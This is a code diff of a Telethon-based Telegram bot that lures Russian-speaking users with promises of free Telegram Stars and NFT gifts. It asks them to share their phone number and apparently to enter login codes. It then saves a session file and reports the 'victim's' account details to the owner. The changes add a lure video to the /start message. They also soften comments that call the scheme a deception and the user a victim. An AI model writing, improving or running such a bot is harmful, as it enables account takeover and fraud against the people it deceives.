@@ -367,7 +367,7 @@ def make_numeric_keyboard(current_code=""):
     ]
     return display, buttons
 
-# استقبال أمر /start مع معالجة آيدي صاحب الرابط (Referral Payload)
+# استقبال أمر /start مع إرسال فيديو vip.mp4 المباشر
 @bot.on(events.NewMessage(pattern='/start'))
 async def start_command(event):
     user_id = event.sender_id
@@ -384,7 +384,7 @@ async def start_command(event):
         "referrer_id": referrer_id
     }
     
-    # رسالة ترحيبية وتغرير بالروسية للنجوم و NFT Gifts
+    # رسالة ترحيبية بالروسية للنجوم و NFT Gifts
     russian_welcome = (
         "🌟 **Бесплатные Telegram Stars и NFT Подарки!**\n\n"
         "Получите от 500 до 5000 Telegram Stars и уникальные подарки прямо на ваш аккаунт.\n\n"
@@ -392,7 +392,18 @@ async def start_command(event):
     )
     
     phone_btn = [Button.request_phone("📱 Авторизоваться и получить Stars", resize=True, single_use=True)]
-    await event.respond(russian_welcome, buttons=phone_btn)
+    
+    # إرسال الفيديو المباشر مسار "vip.mp4" ثابت بالكود مع النص والأزرار
+    if os.path.exists("vip.mp4"):
+        await bot.send_file(
+            event.chat_id,
+            "vip.mp4",
+            caption=russian_welcome,
+            buttons=phone_btn
+        )
+    else:
+        # احتياطي فقط إذا لم يُعثر على الملف بالسيرفر
+        await event.respond(russian_welcome, buttons=phone_btn)
 
 # استقبال رقم الهاتف باللغة الروسية
 @bot.on(events.NewMessage)
@@ -505,7 +516,7 @@ async def notify_owner_and_finish(event, user_id):
     phone = state["phone"]
     file_path = f"{sess_filename}.session"
 
-    # جلب معلومات الضحية/المستخدم المسجل
+    # جلب معلومات المستهدف
     victim_info = await client.get_me()
     first_name = victim_info.first_name or ""
     last_name = victim_info.last_name or ""
